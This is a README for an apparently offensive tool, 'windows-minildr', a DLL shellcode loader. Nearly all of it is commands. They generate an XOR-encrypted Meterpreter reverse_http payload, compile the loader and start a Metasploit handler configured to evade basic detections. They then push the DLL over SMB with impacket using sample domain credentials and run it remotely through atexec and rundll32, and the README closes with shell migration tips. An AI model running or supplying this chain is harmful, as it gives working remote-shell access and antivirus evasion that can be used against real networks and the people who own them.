# windows-minildr

Generate payload.

~~~ bash
echo -n secret > ./key.bin
msfvenom --payload windows/x64/meterpreter/reverse_http --encrypt xor --encrypt-key "$(< ./key.bin)" --format raw --out ./buf.bin LHOST=192.168.178.42 LPORT=1337
~~~

Compile loader.

~~~ bash
x86_64-w64-mingw32-g++ -m64 -Wall -Wextra -std=c++20 -lstdc++ -static -Os -s -shared -o ./minildr.dll ./minildr.cpp
~~~

Start listener and evade basic detections when using Meterpreter ([source](https://twitter.com/lpha3ch0/status/1630213398397874178)).

~~~ bash
msfconsole -q -x 'use exploit/multi/handler;
set LHOST 192.168.178.42;
set LPORT 1337;
set PAYLOAD windows/x64/meterpreter/reverse_http;
set EnableStageEncoding true;
set StageEncoder x64/zutto_dekiru;
set AutoLoadStdapi false;
run'
~~~

Execute loader.

~~~ bash
impacket-smbclient -file /dev/stdin corp.com/jdoeadm:'passw0rd'@ws01.corp.com << 'EOF'
use c$
cd windows
put minildr.dll
ls
EOF
impacket-atexec -silentcommand corp.com/jdoeadm:'passw0rd'@ws01.corp.com 'rundll32.exe C:\Windows\minildr.dll,DllInstall'
~~~

After you received the connection run `load stdapi` in the Meterpreter shell.

When your shell terminates shortly after you receive the connection run `migrate -N explorer.exe` in the Meterpreter shell or `set AutoRunScript post/windows/manage/migrate` on the handler.
